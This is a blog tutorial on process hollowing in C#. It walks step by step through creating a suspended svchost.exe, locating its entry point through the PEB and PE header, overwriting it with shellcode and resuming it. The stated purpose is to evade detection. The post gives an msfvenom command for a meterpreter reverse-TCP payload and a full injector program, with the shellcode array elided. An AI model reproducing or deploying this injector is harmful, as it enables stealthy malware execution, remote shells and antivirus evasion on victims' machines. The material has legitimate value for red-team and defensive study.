---
layout: post
title: Unleashing the Power of In-Memory Code Injection Part-I .
description: "In-Memory Code Injection"
modified: 2023-7-24
tags: [In-Memory Code Injection, Malware]
image:
  feature: memory.png
---
<style>
.tablelines table, .tablelines td, .tablelines th {
        border: 1px solid black;
        }
</style>
Our objective is to inject code into process such as svchost.exe, which typically generates network activity, in order to avoid detection.

However, svchost.exe processes run at the SYSTEM integrity level, making it impossible to inject code from a lower integrity level. To overcome this, the process hollowing technique is employed.

> **Info:**
> Windows defines four integrity levels: low, medium, high, and system. Standard users receive medium, elevated users receive high. Processes you start and objects you create receive your integrity level (medium or high) or low if the executable file's level is low; system services receive system integrity.

By injecting code into processes such as svchost.exe that generate network activity, the injected code can blend in with the legitimate process's expected behavior. This makes it harder for security mechanisms to detect the malicious activity.

## Steps to perform process hollowing:

1. Create a new process and make it suspended to halt the process execution before it starts.
2. Retrieve information about the created process (in our case svchost process).
3. Extract the base address of the created process.
4. Modify the memory of the suspended process by overwriting the in-memory content of the EntryPoint with the desired code or payload.
5. Resume the execution of the process, allowing the modified code to run within the target process. The injected code now executes within the process without terminating it, enabling the desired actions or malicious activities to be carried out.

# Delving into the Technical Nitty-Gritty:

Let's take an example of implementing process hollowing in C#.

### 1: First we need to create a suspended process using the Win32 CreateProcess API.

Let's import CreateProcess API and examine the required arguments.

```csharp
[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
[In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION
lpProcessInformation);
```

The CreateProcess API accepts some arguments.

| Argument    | Description |
| :--------   | :------- |
| string lpApplicationName | The name of the application    |
| string lpCommandLine | The full commandline to be executed: in our scenario we will set this the full path of svchost.exe C:\\Windows\\System32\\svchost.exe     |
| IntPtr lpProcessAttributes    | For security descriptor : we can set this to null to obtain the default descriptor    |
| IntPtr lpThreadAttributes  | For security descriptor : we can set this to null to obtain the default descriptor   |
| bool bInheritHandles | To specify if any handles in our current process should be inherited by the new process: set this to false     |
| uint dwCreationFlags    | This one is very important we need to set this to CREATE_SUSPENDED to create the process in a suspended state. we can achieve this using the numerical representation of CREATE_SUSPENDED, which is 0x4    |
| IntPtr lpEnvironment  | To specify the environment variable settings to be use: set this to null    |
| string lpCurrentDirectory  | We do not care about CurrentDirectory argument, so set this to null     |
| STARTUPINFO lpStartupInfo    | We need to pass an object to specify how the new process should be configured    |
| PROCESS_INFORMATION lpProcessInformation    | We need to pass an object to specify information about the new process, including the process ID and a handle to the process.    |
{: .tablelines}

> **Info:**
> The security descriptor defines who can access the object and what operations they can perform on it.

Let's create the required structures for CreateProcess API (The structures are obtained from www.pinvoke.net)

```csharp
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
struct STARTUPINFO
{
public Int32 cb;
public IntPtr lpReserved;
public IntPtr lpDesktop;
public IntPtr lpTitle;
public Int32 dwX;
public Int32 dwY;
public Int32 dwXSize;
public Int32 dwYSize;
public Int32 dwXCountChars;
public Int32 dwYCountChars;
public Int32 dwFillAttribute;
public Int32 dwFlags;
public Int16 wShowWindow;
public Int16 cbReserved2;
public IntPtr lpReserved2;
public IntPtr hStdInput;
public IntPtr hStdOutput;
public IntPtr hStdError;
}
```

```csharp
[StructLayout(LayoutKind.Sequential)]
internal struct PROCESS_INFORMATION
{
public IntPtr hProcess;
public IntPtr hThread;
public int dwProcessId;
public int dwThreadId;
}
```

Now, we can create the process as the following.

```csharp
STARTUPINFO StartInfo = new STARTUPINFO(); // instantiating a STARTUPINFO object
PROCESS_INFORMATION ProcInfo = new PROCESS_INFORMATION(); //instantiating a PROCESS_INFORMATION object

// Everything is ready, we can now create the process as the following:
bool res = CreateProcessW(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref StartInfo, out ProcInfo);
```

### 2: The next step involves locating the entry point of the created process by retrieving the PEB (Process Environment Block) through the ZwQueryInformationProcess API. 

> **Info:**
> The Process Environment Block (PEB) is a data structure in Windows operating systems that stores information related to a process's environment and execution state.  The address of the PEB is specific to each process and is located in the process's address space.

Let's import ZwQueryInformationProcess API and examine the required arguments.

```csharp
[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
private static extern int ZwQueryInformationProcess(IntPtr hProcess,
int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
uint ProcInfoLen, ref uint retlen);
```

| Argument    | Description |
| :--------   | :------- |
| IntPtr hProcess | The process handle. We can obtain this from the PROCESS_INFORMATION structure we created  |
| int procInformationClass  | Set this to ProcessBasicInformation with a numerical representation of "0"     |
| ref PROCESS_BASIC_INFORMATION procInformation    | We need to pass an object to specify the process information.  |
| uint ProcInfoLen  | The process information length (The size of the input structure)   |
| ref uint retlen| The size of the fetched data |
{: .tablelines}

We need to pass PROCESS_BASIC_INFORMATION object to ZwQueryInformationProcess API.
Let's create the required structure for ZwQueryInformationProcess API (The structure is obtained from www.pinvoke.net)

```csharp
[StructLayout(LayoutKind.Sequential)]
internal struct PROCESS_BASIC_INFORMATION
{
public IntPtr Reserved1;
public IntPtr PebAddress;
public IntPtr Reserved2;
public IntPtr Reserved3;
public IntPtr UniquePid;
public IntPtr MoreReserved;
}
```

Now, we can execute ZwQueryInformationProcess and fetch the PEB.

```csharp
PROCESS_BASIC_INFORMATION BasicInfo = new PROCESS_BASIC_INFORMATION();
uint tmp = 0;
IntPtr hProcess = ProcInfo.hProcess;
ZwQueryInformationProcess(hProcess, 0, ref BasicInfo, (uint)(IntPtr.Size * 6), ref tmp);
IntPtr ptrToImageBase = (IntPtr)((Int64)BasicInfo.PebAddress + 0x10);
```

After fetching the PEB address, we need to get the PE header and parse it to locate the process entry point.

> **Info:**
> Portable Executable (PE) headers, are data structures within the executable files of Windows operating systems. These headers contain essential information about the executable file, allowing the operating system to properly load and execute the program. There are multiple main components of the PE headers the one we care about is IMAGE_NT_HEADERS which contains the entry point.

### 3: We will use ReadProcessMemory to fetch the address of the code base and parse the PE Header to get the entry point. 

let's import and examine the arguments required by ReadProcessMemory API.

```csharp
[DllImport("kernel32.dll", SetLastError = true)]
static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
[Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
```

| Argument    | Description |
| :--------   | :------- |
| IntPtr hProcess | The process handle. We can obtain this from the PROCESS_INFORMATION structure we created  |
| IntPtr lpBaseAddress | The address to read from |
| [Out] byte[] lpBuffer   | A buffer to copy the content into  |
| int dwSize  | The number of bytes to read   |
| out IntPtr lpNumberOfBytesRead| To contain the number of bytes actually read |
{: .tablelines}

The memory address takes up eight bytes in a 64-bit process, while it only uses four bytes in a 32-bit process

Now we can read the base code memory address using the following.

```csharp
byte[] addrBuf = new byte[0x8];
IntPtr nRead = IntPtr.Zero;
ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
```

The svchostBase contains the pointer to the base code address of svchost (the created process).

Next we need to parse this to get the entry point of the process. We will use ReadProcessMemory API again to read the PE header address and then calculate the process entry point.

> **Info:**
> The PE header located at offset 0x3C and the memory address of the entry point located at (the address of PE Header which at offset 0x3C + 0x28 + the process base memory address). so we need to read the content of offset 0x3C.

We can achieve that using the following code:

```csharp
byte[] data = new byte[0x200];
ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
uint opthdr = e_lfanew_offset _+ 0x28;
uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
```

we have obtained the process entry point address, so let's replace the process memory content with the desired shellcode.

### 4: We will use WriteProcessMemory API to replace the process memory content with the desired shellcode.

Let's import and examine the arguments required by WriteProcessMemory.y API.

```csharp
[DllImport("kernel32.dll")]
static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
```

| Argument    | Description |
| :--------   | :------- |
| IntPtr hProcess | The process handle. |
| IntPtr lpBaseAddress | The address to write to |
| byte[] lpBuffer   | The byte array containing the code that we want to write  |
| Int32 nSize  | The size of the code to be copied   |
| out IntPtr lpNumberOfBytesWritten| To specify how much data was copied |
{: .tablelines}

First, create your simple shell code using the following command.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={YOUR-IP-ADDRESS} LPORT={YOUR LISTENING PORT} EXITFUNC=thread -f csharp
```
Now, we can write our shellcode into the created process memory using the following.

```csharp
byte[] shellcode = new byte[511] {
0xac,0x65,0x93,,0xf2,0xe6...
};
WriteProcessMemory(hProcess, addressOfEntryPoint, shellcode, shellcode.Length, out nRead);
```

### 5: The code is then executed by calling ResumeThread to let the suspended thread continue its execution as shown below.

```csharp
[DllImport("kernel32.dll", SetLastError = true)]
private static extern uint ResumeThread(IntPtr hThread);
```

ResumeThread only accepts one argument which is the handle of the thread. we can get this value from PROCESS_INFORMATION structure that we used while creating the process.

Now we can resume the process using the following

```csharp
ResumeThread(ProcInfo.hThread);
```

After combining all the code, the project should be compiled for a 64-bit architecture since svchost.exe is a 64-bit process and the resulting compiled code will execute the shellcode within the svchost.exe process.

> **Note:**
> While our shellcode executes within a trusted process that communicates over the network, it remains detectable. Further efforts are required to achieve full evasion of anti-virus measures. In our upcoming articles, we will delve into more techniques to enhance our ability to operate covertly and bypass security measures such as shellcode encryption, obfuscation, and antivirus emulator bypass.


## The Full Code

```csharp
using System;
using System.Runtime.InteropServices;

public class Program
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    struct STARTUPINFO
    {
        public Int32 cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr Reserved1;
        public IntPtr PebAddress;
        public IntPtr Reserved2;
        public IntPtr Reserved3;
        public IntPtr UniquePid;
        public IntPtr MoreReserved;
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
        ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
        int dwSize, out IntPtr lpNumberOfbytesRW);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint ResumeThread(IntPtr hThread);

    public static void Main(string[] args)
    {
        byte[] shellcode = new byte[511] {
            0xac,0x65,0x93,,0xf2,0xe6...
            };
        STARTUPINFO StartInfo = new STARTUPINFO();
        PROCESS_INFORMATION ProcInfo = new PROCESS_INFORMATION();
        bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
            false, 0x4, IntPtr.Zero, null, ref StartInfo, out ProcInfo);

        PROCESS_BASIC_INFORMATION BasicInfo = new PROCESS_BASIC_INFORMATION();
        uint tmp = 0;
        long qResult = ZwQueryInformationProcess(ProcInfo.hProcess, 0, ref BasicInfo, (uint)(IntPtr.Size * 6), ref tmp);
        IntPtr baseImageAddr = (IntPtr)((Int64)BasicInfo.PebAddress + 0x10);

        byte[] addrBuf = new byte[0x8];
        IntPtr bytesRW = new IntPtr();
        bool result = ReadProcessMemory(ProcInfo.hProcess, baseImageAddr, addrBuf, addrBuf.Length, out bytesRW);
        IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(addrBuf, 0);


        byte[] data = new byte[0x200];
        result = ReadProcessMemory(ProcInfo.hProcess, executableAddress, data, data.Length, out bytesRW);
        uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);
        uint opthdr = e_lfanew_offset + 0x28;
        uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
        IntPtr addressOfEntryPoint = (IntPtr)((Int64)executableAddress + entrypoint_rva);


        result = WriteProcessMemory(ProcInfo.hProcess, addressOfEntryPoint, shellcode, shellcode.Length, out bytesRW);

        uint rResult = ResumeThread(ProcInfo.hThread);
    }
}
```